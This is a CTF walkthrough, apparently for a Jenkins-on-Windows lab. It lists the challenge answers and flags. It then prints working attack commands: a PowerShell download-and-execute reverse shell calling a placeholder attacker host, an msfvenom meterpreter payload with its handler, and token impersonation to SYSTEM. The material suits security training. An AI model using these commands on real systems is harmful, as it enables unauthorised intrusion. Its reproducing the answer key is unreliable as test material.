# Questions

1. How many ports are open? (TCP only)
	1. 3
2. What is the username and password for the login panel?
	1. admin:admin
3. What is the user.txt flag?
	1. 79007a09481963edf2e1321abd9ae2a0
4. What is the final size of the exe payload that you generated?
	1. 73802
5. Use the `impersonate_token "BUILTIN\Administrators"` command to impersonate the Administrators' token. What is the output when you run the `getuid` command?
	1. NT AUTHORITY\SYSTEM
6. Read the root.txt file located at C:\Windows\System32\config
	1. dff0f748678f280250f25a45b8046b4a

# Write up

## Initial Access

Start by scanning for open ports and versions of software running on those ports `nmap -sV TARGET_IP` this shows us 3 open ports 80,3389,8080 running a Microsoft IIS httpd 7.5 server, an ssl server, and Jetty 9.4.z-Snapshot respectively.

We can then fuzz different endpoints `ffuf` of the webserver running on port 8080, doing so gives us a login portal. We can either try to brute force the login using something like hydra or try default credentials; in this case the defaults admin:admin work to give us access.  

Now that we have access to the Jenkins instance, we can create a new project and add a build instruction to execute the following windows batch command which gives us a reverse shell `powershell iex (New-Object Net.WebClient).DownloadString('http://ATTACKER-IP:ATTACKER-WEBSERVER-PORT/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER-IP -Port NC-PORT`

once we have the reverse shell we can find and output the contents of the user flag `get-content C:\users\bruce\Desktop\user.txt`

## Switching Shells

Now that we have access, we want to switch to a meterpreter shell, we can generate the payload using msfvenom `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=tun0 LPORT=5000 -f exe -o shell-name.exe`

We can then download the file to the following `powershell "(New-Object System.Net.WebClient).Downloadfile('http://ATTACKER-IP:ATTACKER-WEBSERVER-PORT/shell-name.exe','shell-name.exe')"`

We then want to prep metasploit to recieve the session using the following commands
``` bash
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST tun0 
set LPORT 5000
run
```

## Privilege Escalation

Now that we have initial access, let's use token impersonation to gain system access. In PS run `whoami /priv` to get a list of enabled privleges. You can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled.

To exploit these, we'll use the following commands. Once we impersonate an admin, we can migrate to a process with the appropriate privileges and read from the root.txt file
``` bash
load incognito
list_tokens -g
impersonate_token "BUILTIN\Administrators"
pid
migrate "services.exe pid"
cat C:/Windows/System32/config/root.txt
```